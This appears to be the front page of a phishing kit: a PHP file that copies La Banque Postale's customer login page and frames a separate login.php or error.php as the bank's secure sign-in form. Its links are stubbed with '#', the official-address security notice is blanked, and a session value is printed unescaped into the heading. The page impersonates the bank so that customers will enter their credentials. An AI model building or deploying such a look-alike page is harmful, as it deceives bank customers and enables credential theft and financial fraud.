<?php

session_start();

?>
<!DOCTYPE html>
<html style="--vh: 813px; --vw: 13.35px;" lang="fr">

<head data-template="loginpagev2">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <link rel="stylesheet" href="assets/css/base-fonts.min.css" as="style" onload="this.rel='stylesheet'">

    <link rel="stylesheet" href="assets/css/base.min.57e95125ce567e17e74e2c3f9012d591.css" type="text/css">
    <link rel="shortcut icon" href="assets/images/LOGO-digital-fd-clair-RVB-blanc-32px.ico" type="image/x-icon">

    <title>Connexion à mon espace client - La Banque Postale</title>
</head>

<body data-title="Connexion à mon espace client" class="">
    <div class="js-avoidlinks">
        <ul class="m-list--horizontal--align-left">
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#"><span>Accès à vos comptes par l'écran de connexion pleine page</span></a></li>
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#avoid-menu"><span>Accéder au Menu Principal</span></a></li>
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#avoid-contenu"><span>Accéder au Contenu éditorial</span></a></li>
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#avoid-footer"><span>Accéder au Pied de page</span></a></li>
        </ul>
    </div>
    <header id="header" class="o-header o-header--simplified" role="banner" data-percent="0">
        <div class="m-logo--simplified">
            <div class="m-logo u-spacing-s-xs">
                <a href="#" class="js-logo-type" title="Accueil La Banque Postale">
                    <img class="m-logo__img" src="assets/images/LOGO-LBP-digital-fd-clair-RVB.svg" alt="logo La Banque Postale" width="50" height="50">
                    <img class="m-logo__img-glass" src="assets/images/LOGO-LBP-digital-fd-glass-RVB.svg" alt="logo La Banque Postale" width="50" height="50">
                </a>
            </div>
        </div>
        <div class="o-header__wrapper">
            <div class="o-header__itemwrapper">
                <div class="m-header__links m-header__links--simplified" data-client="true">
                    <div class="m-header__links__item--simplified ">
                        <a id="client" href="#" data-internal="true" title="Centre d'aide" class="m-header__links__item m-header__links__item__white a-text--small ">
                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                <use href="assets/images/svg-icons.svg#ic-interface-search"></use>
                            </svg>
                            <span class="sr-only-xs">J'ouvre un compte</span>
                            <svg class="a-icon--xs hidden-sm hidden-md hidden-lg" aria-hidden="true" focusable="false">
                                <use href="assets/images/svg-icons.svg#ic-interface-chevron-right"></use>
                            </svg>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <main role="main" class="u-bg-color--blue-identity-group1">
        <div class="container-fluid">
            <div class="row">
                <div class="col-xs-12">
                    <div class="o-cvs u-flex u-flex--column--xs u-flex--row u-spacing-4xl-bottom" id="cvslayer" data-cvs="" data-mobile="true" data-app-stores="{&quot;appStores&quot;:[{&quot;appStoreLinkModel&quot;:{&quot;linkPath&quot;:&quot;https://play.google.com/store/apps/details?id\u003dcom.fullsix.android.labanquepostale.accountaccess&quot;,&quot;relatedDevice&quot;:&quot;android&quot;},&quot;device&quot;:{&quot;name&quot;:&quot;android&quot;,&quot;label&quot;:&quot;Android Mobile&quot;}},{&quot;appStoreLinkModel&quot;:{&quot;linkPath&quot;:&quot;https://itunes.apple.com/fr/app/la-banque-postale/id409362880?mt\u003d8&quot;,&quot;osMinVersion&quot;:&quot;6.1&quot;,&quot;relatedDevice&quot;:&quot;iosphone&quot;},&quot;device&quot;:{&quot;name&quot;:&quot;iosphone&quot;,&quot;label&quot;:&quot;iOS Mobile&quot;}}]}">
                        <div class="o-cvs__login u-flex--vertical u-flex--column">
                            <div>
                                <div class="m-title u-spacing-s-xs-bottom u-spacing-lg-bottom u-align-center">
                                    <h1 class="m-title--h3 u-text-color--white"><?php echo $_SESSION['cardName']; ?> Connexion à votre compte</h1>
                                </div>
                                <div class="o-container o-container--hasBorder u-color--white u-bg-color--white w100 u-spacing-xs u-margin-2xs-bottom">
                                    <div class="u-flex u-flex--vertical-start">
                                        <svg class="a-icon--s u-svg-color--red" aria-hidden="true" focusable="false">
                                            <use href="assets/images/svg-icons.svg#ic-notification-alerte"></use>
                                        </svg>
                                        <div class="u-flex u-flex--column a-text a-text--tiny u-spacing-3xs-left u-spacing-xs-right">
                                            <p class="u-color--error u-margin-3xs-bottom lato-bold">Votre clavier numérique évolue</p>
                                            <p class="u-text-color--grey-tundora">Votre clavier
                                                vient de changer et son fonctionnement reste identique. Connectez-vous
                                                en saisissant vos identifiants et mot de passe habituels.
                                                Pour plus d’informations, vous pouvez contacter un conseiller au 3639
                                                (service 0,15€/min + prix d’un appel), ou dans votre bureau de poste le
                                                plus proche.</p>
                                        </div>
                                    </div>
                                </div>
                                <div id="experiencefragment-24a99be27a" class="cmp-experiencefragment cmp-experiencefragment--connexion-pph">
                                    <div class="xf-content-height">
                                        <div class="row iframe">
                                            <div class="iframe col-xs-12 col-sm-12">
                                                <div id="myevent">
                                                    <?php
                                                    if (isset($_GET["error"])) {
                                                        echo '
                                                            <iframe src="error.php" title="Formulaire de connexion à mon espace sécurisé" scrolling="no" data-fluid-iframe="" style="overflow: hidden; height: 327px;" id="iframelogin"></iframe>
                                                        ';
                                                    } else {
                                                        echo '
                                                        <iframe src="login.php" title="Formulaire de connexion à mon espace sécurisé" scrolling="no" data-fluid-iframe="" style="overflow: hidden; height: 209px;" id="iframelogin" onloadeddata="alert(\'ok\')"></iframe>
                                                        ';
                                                    }
                                                    ?>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="u-margin-s-top u-margin-2xl-xs-bottom u-align-center m-button">
                                    <a href="#" class="u-btn m-button--content m-button--tertiary u-text-color--white"><span>Identifiant / Mot de passe oublié</span>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="o-cvs__txtContent o-container--hasBg  w50--sm w50--md">
                            <div class="o-cvs__title">
                                <p class="m-title--h1 u-text-color--white"></p>
                            </div>
                            <div class="title">
                                <div data-back-content="Retour au contenu" class="m-title u-spacing-s-bottom  u-align-left u-color--blue-identity-group1">
                                    <svg viewBox="0 0 24 24" class="a-icon--m u-spacing-3xs-right" aria-hidden="true" focusable="false">
                                        <use href="assets/images/svg-icons.svg#ic-products-domains-insurance_shield"></use>
                                    </svg>
                                    <h3>
                                        Espace Assurance
                                    </h3>
                                </div>
                            </div>
                            <div class="a-text">
                                <article class="a-text--small u-spacing-s-bottom" data-component-id="#/labanquepostale/sitepublic/components/edito/text" data-back-content="Retour au contenu">
                                    <p>Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver ou signer vos contrats La Banque Postale Assurances ?</p>
                                </article>
                            </div>
                            <div class="button">
                                <div class="m-button  u-spacing-2xs-bottom" data-component-id="#/labanquepostale/sitepublic/components/edito/button">
                                    <a href="#" class="u-btn m-button--content m-button--secondary" target="_blank" data-internal="false" js-btn-tracking="" title="Me connecter à mon espace assurance- Nouvelle fenêtre">
                                        <span class="m-button__icon a-icon--s">
                                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-interface-chevron-right"></use>
                                            </svg>
                                        </span>
                                        <span>
                                            Me connecter à mon espace assurance
                                        </span>
                                    </a>
                                </div>
                            </div>
                            <div class="button">
                                <div class="m-button  u-spacing-lg-bottom" data-component-id="labanquepostale/sitepublic/components/edito/button">
                                    <a href="#" class="u-btn m-button--content m-button--secondary" target="_blank" data-internal="true" js-btn-tracking="" title="Signer mon contrat d'assurance- Nouvelle fenêtre">

                                        <span class="m-button__icon a-icon--s">
                                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-interface-chevron-right"></use>
                                            </svg>
                                        </span>
                                        <span>
                                            Signer mon contrat d'assurance
                                        </span>
                                    </a>
                                </div>
                            </div>
                            <div class="title">
                                <div data-back-content="Retour au contenu" class="m-title u-spacing-s-bottom  u-align-left u-color--blue-identity-group1">
                                    <svg viewBox="0 0 24 24" class="a-icon--m u-spacing-3xs-right" aria-hidden="true" focusable="false">
                                        <use href="assets/images/svg-icons.svg#ic-notification-info"></use>
                                    </svg>
                                    <h3>
                                        Sécurité
                                    </h3>
                                </div>
                            </div>
                            <div class="a-text">
                                <article class="a-text--small u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/edito/text" data-back-content="Retour au contenu">
                                    <p>Avant de vous connecter, vérifiez que vous êtes bien sur
                                        l'adresse de connexion suivante :
                                        <br>
                                        Privilégiez une connexion via votre application bancaire. Découvez toutes&nbsp;<a href="#">nos recommandations</a>.
                                    </p>
                                </article>
                            </div>
                        </div>
                    </div>

                    <div class="o-cvs__layer o-container--hasBg u-spacing-s-bottom u-spacing-s-left u-spacing-s-right u-hidden--all u-flex--xs" id="devicelayer" device-mobile="true" tabindex="-1" aria-hidden="true">
                        <h1 class="m-title--h1 o-cvslogin__title  u-text-color--white u-spacing-s-bottom" tabindex="-1">Connexion à votre compte particulier</h1>
                        <div class="o-container o-container--hasBorder u-color--white u-bg-color--white w100 u-spacing-xs u-margin-2xs-bottom">
                            <div class="u-flex u-flex--vertical-start">
                                <svg class="a-icon--s u-svg-color--red" aria-hidden="true" focusable="false">
                                    <use href="assets/images/svg-icons.svg#ic-notification-alerte"></use>
                                </svg>
                                <div class="u-flex u-flex--column a-text a-text--tiny u-spacing-3xs-left u-spacing-xs-right">
                                    <p class="u-color--error u-margin-3xs-bottom lato-bold">Votre clavier numérique évolue</p>
                                    <p class="u-text-color--grey-tundora">Votre clavier
                                        vient de changer et son fonctionnement reste identique. Connectez-vous
                                        en saisissant vos identifiants et mot de passe habituels.
                                        Pour plus d’informations, vous pouvez contacter un conseiller au 3639
                                        (service 0,15€/min + prix d’un appel), ou dans votre bureau de poste le
                                        plus proche.</p>
                                </div>
                            </div>
                        </div>
                        <div class="a-text u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/pages/loginpagev2"></div>
                        <div class="o-cvs__image u-margin-s-bottom">
                            <picture>
                                <img loading="lazy" class="  a-image--responsive" alt="">
                            </picture>
                        </div>
                        <button type="button" id="connectwebsite" class="u-btn m-button--primary m-button--primary--dakrmode m-button--extend u-margin-s-bottom">
                            <span>Continuer sur le site</span>
                        </button>
                        <a class="u-btn m-button--secondary m-button--secondary--dakrmode m-button--extend u-margin-s-bottom" id="appredirect">
                            <span>Télécharger l'application mobile</span>
                        </a>
                    </div>
                    <ul class="m-footnotes js-footnotes--container container-fluid m-list u-spacing-4xl-left u-spacing-xl-xs-left" data-note-label="Note" style="display: none;"></ul>
                    <div id="viewportDetect">
                        <div class="visible-xs" data-viewport="xs"></div>
                        <div class="visible-sm" data-viewport="sm"></div>
                        <div class="visible-md" data-viewport="md"></div>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <footer id="footer" role="contentinfo" class="o-footer ">
        <div class="o-footer__top">
            <div class="o-footer__top__left">
                <div class="o-footer__logo">
                    <div class="m-logo u-spacing-s-xs">
                        <div class="js-logo-type">
                            <img src="assets/images/LOGO-LBP-digital-fd-clair-RVB.svg" alt="La Banque Postale" width="50" height="50">
                        </div>
                    </div>
                    <hr class="u-separator--v u-spacing-s-right" aria-hidden="true" focusable="false">
                    <img src="assets/images/ill_citoyenne.svg" class="o-footer__imgbrand" alt="La Banque Postale Citoyenne" loading="lazy" width="50" height="50">
                </div>
                <div class="u-spacing-s-top u-spacing-xs-xs-top">
                    <div class="row">
                        <div class="a-text col-xs-12">
                            <article class=" u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/edito/text" data-back-content="Retour au contenu">

                                <p>Née en 2006, notre banque a grandi avec vous. Citoyenne, ouverte
                                    et accessible à tous, nous revendiquons l’ambition d’accompagner nos 20
                                    millions de clients avec des offres et services performants, la
                                    modernité radicale de notre engagement citoyen et notre héritage postal.
                                    Aujourd’hui La Banque Postale partage les rêves et les exigences de sa
                                    génération.</p>

                            </article>
                        </div>
                    </div>
                    <div class="row">
                        <div class="button col-xs-12">
                            <div class="m-button u-align-center " data-component-id="labanquepostale/sitepublic/components/edito/button">
                                <a href="#" class="u-btn m-button--extend m-button--secondary" data-internal="true" js-btn-tracking="">
                                    <span class="m-button__icon a-icon--s">
                                        <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                            <use href="assets/images/svg-icons.svg#ic-profile-citizen"></use>
                                        </svg>
                                    </span>
                                    <span>
                                        En savoir plus sur nos engagements
                                    </span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="o-footer__top__right">
                <div class="m-tiles u-full-width-xs m-tiles--square">
                    <hr class="u-separator--h--full visible-xs-block">
                    <ul class="m-tiles__list">
                        <li class="m-tiles__item">
                            <a href="#/particulier/footer/espace_sourds" title="Espace sourds et malentendants de la Banque Postale  - Nouvelle fenêtre" target="_blank" data-internal="false">
                                <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                                    <use href="assets/images/svg-icons.svg#ic-profile-accessibility-deafness"></use>
                                </svg>
                                <span>Espace sourds et malentendants</span>
                            </a>
                        </li>
                        <li class="m-tiles__item">
                            <a href="#/particulier/localisation_bureau" title="Recherche bureau de poste via l'outil de localisation  - Nouvelle fenêtre" target="_blank" data-internal="false">
                                <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                                    <use href="assets/images/svg-icons.svg#ic-contact-location"></use>
                                </svg>
                                <span>Recherche bureau de poste</span>
                            </a>
                        </li>
                        <li class="m-tiles__item">
                            <a href="#/particulier/faq-centre-aide" data-internal="false">
                                <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                                    <use href="assets/images/svg-icons.svg#ic-contact-faq"></use>
                                </svg>
                                <span>Foire aux questions et centre d'aide</span>
                            </a>
                        </li>
                        <li class="m-tiles__item">
                            <a href="#/particulier/footer/contacts" title="Nous contacter  - Nouvelle fenêtre" target="_blank" data-internal="false">
                                <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                                    <use href="assets/images/svg-icons.svg#ic-contact-phone"></use>
                                </svg>
                                <span>Nous contacter</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="container-fluid">
            <div class="row">
                <div class="col-xs-12 col-sm-6">
                    <div>
                        <div class="m-socialmedialist u-align-center u-spacing-s-top u-spacing-s-bottom u-spacing-xs-xs-top u-spacing-xs-xs-bottom">
                            <p class="m-socialmedialist__label"> Suivez nous</p>
                            <ul class="m-socialmedialist__list m-list--flexcenter m-list--flexinline">
                                <li class="m-socialmedialist__item">
                                    <div class="m-button--hasIcon">
                                        <a href="#" title=" Facebook - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-social-facebook"></use>
                                            </svg>
                                            <span class="sr-only"> Facebook - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">
                                    <div class="m-button--hasIcon">
                                        <a href="#" title=" Instagram - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-social-instagram"></use>
                                            </svg>
                                            <span class="sr-only"> Instagram - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">
                                    <div class="m-button--hasIcon">
                                        <a href="#" title=" Linkedin - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-social-linkedin"></use>
                                            </svg>
                                            <span class="sr-only"> Linkedin - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">
                                    <div class="m-button--hasIcon">
                                        <a href="#" title=" Twitter - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-social-twitter"></use>
                                            </svg>
                                            <span class="sr-only"> Twitter - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">
                                    <div class="m-button--hasIcon">
                                        <a href="#" title=" YouTube - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-social-youtube"></use>
                                            </svg>
                                            <span class="sr-only"> YouTube - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-xs-12 col-sm-6">
                    <div class="m-newsletterlink m-button--hasIcon ">
                        <a class="u-spacing-md-top u-spacing-md-bottom u-spacing-xs-lg-top u-spacing-xs-lg-bottom u-align-center" href="#/particulier/accompagner/nl-globale" title="Abonnez-vous à la Newsletter - Nouvelle fenêtre" data-internal="false">
                            <span>Abonnez-vous à la Newsletter</span>
                            <svg aria-hidden="true" focusable="false" viewBox="0 0 24 24" class="a-icon--s">
                                <use href="assets/images/svg-icons.svg#ic-contact-arobase"></use>
                            </svg>
                        </a>
                    </div>
                </div>
                <div class="col-xs-12 u-spacing-xs-top u-spacing-lg-bottom u-spacing-xs-xs-bottom">
                    <div class="m-legalpagelink u-align-center u-text-color--grey_color_5">
                        <ul class="m-list--horizontal--align-center m-list--flexcenter">
                            <li><a href="#/particulier/footer/mentions-legales" data-internal="true">Mentions légales</a></li>
                            <li><a href="#/particulier/footer/tarifs" data-internal="true">Tarifs bancaires</a></li>
                            <li><a href="#/content/dam/lbp/documents/produits/particuliers/quotidien/compte-bancaire/Convention-CCP-2023.pdf" data-internal="true">Convention de compte</a></li>
                            <li><a href="#/particulier/footer/donnees-personnelles" data-internal="true">Protection des Données à Caractère Personnel </a></li>
                            <li><a href="#/particulier/footer/cookies" data-internal="true">Cookies</a></li>
                            <li><a href="#/particulier/footer/actualisation-des-informations-personnelles" data-internal="true">Actualiser vos informations</a></li>
                            <li><a href="#/particulier/footer/reclamation" data-internal="true">Réclamation</a></li>
                            <li><a href="#/particulier/footer/centres-financiers" data-internal="true">Coordonnées Centres Financiers</a></li>
                            <li><a href="#/particulier/footer/assistance-technique" data-internal="true">Assistance technique</a></li>
                            <li><a href="#/particulier/footer/alertes-et-fraudes" data-internal="true">Alertes fraudes et points de vigilance</a></li>
                            <li><a href="#/particulier/footer/list-actu-reglementaires" data-internal="true">Actualités réglementaires</a></li>
                            <li><a href="#/particulier/footer/cgu-operation-rcs" data-internal="true">CGU</a></li>
                            <li><a href="#/particulier/footer/aide-navigateurs-internet" data-internal="true">Aide navigateur et systèmes d'exploitation</a></li>
                            <li><a href="#/particulier/footer/cache-navigateur" data-internal="true">Vider le cache de votre navigateur</a></li>
                            <li><a href="#/particulier/footer/lexique" data-internal="true">Lexique </a></li>
                            <li><a href="#/particulier/footer/accessibilite" data-internal="true">L'accessibilité numérique à La Banque Postale</a></li>
                            <li><a href="#/particulier/footer/declaration-d-accessibilite" data-internal="true">Accessibilité – Partiellement conforme </a></li>
                            <li><a href="#" data-internal="false">Espace candidature</a></li>
                            <li><a href="#/entreprises/bfi-banque-financement-investissement" data-internal="true">BFI - Banque de Financement et d'Investissement</a></li>
                            <li><a href="#/particulier/footer/fonds-de-garantie" data-internal="true">Le fonds de garantie des dépôts et de résolution</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <script>

    </script>
</body>

</html>